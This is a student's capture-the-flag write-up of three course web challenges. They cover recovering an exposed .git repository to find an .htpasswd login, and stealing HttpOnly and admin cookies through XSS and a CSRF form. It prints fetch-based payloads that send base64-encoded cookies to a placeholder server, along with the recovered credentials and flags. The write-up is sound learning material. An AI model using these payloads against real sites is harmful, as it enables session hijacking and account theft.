# HW0x04

## The Stupid Content Tracker
> FLAG{_man_git_THe_StUPid_CONtEnt_TrAcKEr......}

1. Download tool, [scrabble](https://github.com/denny0223/scrabble), from GitHub.
   ```shell
   git clone https://github.com/denny0223/scrabble.git
   ```
2. Follow `README` to recover `.git` repo.
   ```shell
   ./scrabble https://edu-ctf.csie.org:44302
   ```
3. Check for **commit logs**.
   ```shell
   git log --branches
   ```

   Find interesting commit, `Add password`.
   ```shell
    commit 2577aafa9bf476037cb011d59cf433d8a0c09c96
    Author: bookgin <dongsheoil@gmail.com>
    Date:   Sun Nov 1 22:38:45 2020 +0800

        Add password
   ```
4. Switch branch,`2577aafa9bf476037cb011d59cf433d8a0c09c96`.
    ```shell
    git checkout 2577aafa9bf476037cb011d59cf433d8a0c09c96
    ```
    Find `.htpasswd` under folder, `admin_portal_non_production` and view its content.
    ```shell
    thewebmaster:ols2Xrmdja7XaaMP
    ```
5. Use the given `username:password` to login to `https://edu-ctf.csie.org:44302/admin_portal_non_production/index.php` and get the flag.

## Zero Note Revenge
> FLAG{Oh_I_f0rg0t_To_disAble_The_deBug_PagE}

1. Access note that doesn't exist.

   ```
   https://zero-note.edu-ctf.bookgin.tw:44301/note/{id of the note}
   ```

   (since the note doesn't exist, put random string for the `id`)

   value of **cookie**🍪 is in the response $\implies$ use similar method of `Zero Note`

2. As given in the problem description `HttpOnly` 🍪, rather than using `document.cookie`, use the response of querying note that doesn't exit to get 🍪.

3. Construct the note to get flag.

   ```javascript
   ... //get the response of querying a note that doesn't exist
   fetch({url of the server} + '/?' + btoa({important part in the response}) + '\n'));
   ```

4. `Report to admin` $\implies$ receive a *base64 encode* string, `RkxBR3tPaF9JX2YwcmcwdF9Ub19kaXNBYmxlX1RoZV9kZUJ1Z19QYWdFfQo=`

   ```shell
   ❯ echo RkxBR3tPaF9JX2YwcmcwdF9Ub19kaXNBYmxlX1RoZV9kZUJ1Z19QYWdFfQo= | base64 -d
   FLAG{Oh_I_f0rg0t_To_disAble_The_deBug_PagE}
   ```

## Zero Meme
> FLAG{Will_samesite_cookies_by_default_puts_the_final_nail_in_the_CSRF_coffin?}

1. Use **XSS Attack** to get user's 🍪.

   ```javascript
   https://i.imgflip.com/4kp3ij.jpg"><script>fetch({server url} + '\?' + btoa(document.cookie));</script>
   ```

   Get *base64 encode* 🍪 successfully.

2. Since Admin only click on the link without updating the meme, reconstruct the link to let it send 🍪 to the server.

3. Add Note at **Zero Note** which will work as a middleware to get the admin's 🍪.

   - Construct a `form` to send `POST` request to *Zero Meme* and set its input value what is use to get the user's 🍪 in **1.** Also, encode the **input value** to make it work properly.
   - Use `document.getElementById("f").submit();` for *submission*.

4. Submit `https://zero-note.edu-ctf.bookgin.tw:44301/note/{id of the note}` to the admin $\implies$ receive *base64 encode* string, `c2Vzcz1GTEFHe1dpbGxfc2FtZXNpdGVfY29va2llc19ieV9kZWZhdWx0X3B1dHNfdGhlX2ZpbmFsX25haWxfaW5fdGhlX0NTUkZfY29mZmluP30=`

   ```sh
   ❯ echo c2Vzcz1GTEFHe1dpbGxfc2FtZXNpdGVfY29va2llc19ieV9kZWZhdWx0X3B1dHNfdGhlX2ZpbmFsX25haWxfaW5fdGhlX0NTUkZfY29mZmluP30= | base64 -d
   sess=FLAG{Will_samesite_cookies_by_default_puts_the_final_nail_in_the_CSRF_coffin?}
```
   
   